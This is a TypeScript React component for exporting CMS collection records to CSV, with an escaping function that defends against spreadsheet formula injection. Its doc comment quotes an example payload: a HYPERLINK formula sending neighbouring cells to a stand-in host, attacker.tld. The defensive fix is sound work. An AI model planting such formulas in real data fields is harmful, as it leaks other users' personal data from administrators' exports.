'use client'

import React, { useCallback, useState } from 'react'
import { useAupT } from '../../utils/useTranslation.js'

/**
 * Characters that make a spreadsheet read a cell as a formula rather than text.
 * `\t` and `\r` are in the list because Excel strips leading whitespace before
 * deciding.
 */
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/

/**
 * A plain number, which `-` would otherwise send through the neutraliser.
 *
 * `-12.5` is not a formula, and prefixing it with an apostrophe turns a numeric
 * column into text: the spreadsheet stops summing it, sorts it as a string and
 * flags every cell. Amounts, deltas and temperatures are ordinary export
 * content, so the exemption has to exist — and it is free, because no formula
 * matches an anchored number.
 */
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/

/**
 * Escape one CSV cell.
 *
 * Two jobs, and the second one was missing. Collections fed from the outside —
 * a contact form, a signup, a ticket — let an anonymous visitor store
 * `=HYPERLINK("https://attacker.tld/?d="&A2&B2,"Click")` as their name. The old
 * escape only quoted on `,`, `"` or `\n`, none of which a formula contains, so
 * the value reached the file bare and Excel or LibreOffice evaluated it in the
 * administrator's session — exfiltrating neighbouring cells, i.e. the personal
 * data of every other exported row.
 *
 * A leading apostrophe is the standard neutraliser: the cell displays as text.
 * `\r` also joins the quoting condition — alone it was breaking the line split.
 */
export function escapeCsvCell(val: unknown): string {
  if (val === null || val === undefined) return ''
  let str = String(val)

  if (CSV_FORMULA_PREFIX.test(str) && !PLAIN_NUMBER.test(str)) str = `'${str}`

  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return `"${str.replace(/"/g, '""')}"`
  }
  return str
}

interface ExportButtonProps {
  collection: string
  totalDocs: number
}

/**
 * Export button for list views — downloads all filtered documents as CSV.
 * Fetches ALL docs (paginated) then generates CSV client-side.
 */
export const ExportButton: React.FC<ExportButtonProps> = ({ collection, totalDocs }) => {
  const t = useAupT()
  const [exporting, setExporting] = useState(false)

  const handleExport = useCallback(async () => {
    if (exporting || totalDocs === 0) return
    setExporting(true)

    try {
      // Fetch all docs (paginated, max 500)
      const limit = 100
      const pages = Math.min(Math.ceil(totalDocs / limit), 5) // Cap at 500 docs
      const allDocs: Record<string, unknown>[] = []

      for (let page = 1; page <= pages; page++) {
        const url = `/api/${collection}?limit=${limit}&page=${page}&depth=0&sort=-updatedAt`
        const res = await fetch(url, { credentials: 'include' })
        if (!res.ok) break
        const data = await res.json()
        if (data.docs) allDocs.push(...data.docs)
      }

      if (allDocs.length === 0) return

      // Determine columns from first doc
      const skipFields = new Set(['_status', '__v', 'globalType'])
      const columns = Object.keys(allDocs[0]!)
        .filter((key) => !skipFields.has(key))
        .filter((key) => {
          // Skip complex nested objects (keep only scalar values)
          const val = allDocs[0]![key]
          return val === null || val === undefined || typeof val !== 'object' || val instanceof Date
        })

      // Generate CSV
      const escape = escapeCsvCell

      const header = columns.map(escape).join(',')
      const rows = allDocs.map((doc) =>
        columns.map((col) => escape(doc[col])).join(',')
      )
      const csv = [header, ...rows].join('\n')

      // Download
      const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `${collection}-export-${new Date().toISOString().slice(0, 10)}.csv`
      a.click()
      URL.revokeObjectURL(url)
    } catch {
      // Silent fail
    } finally {
      setExporting(false)
    }
  }, [collection, totalDocs, exporting])

  return (
    <button
      onClick={handleExport}
      type="button"
      disabled={exporting || totalDocs === 0}
      style={{
        ...btnStyle,
        opacity: exporting || totalDocs === 0 ? 0.5 : 1,
      }}
      title={t('exportCsv')}
    >
      {exporting ? '...' : '📥'} CSV
    </button>
  )
}

const btnStyle: React.CSSProperties = {
  padding: '4px 10px',
  borderRadius: '6px',
  border: '1px solid var(--theme-elevation-200)',
  background: 'var(--theme-elevation-0)',
  color: 'var(--theme-text)',
  fontSize: '12px',
  fontWeight: 600,
  cursor: 'pointer',
  display: 'flex',
  alignItems: 'center',
  gap: '4px',
}
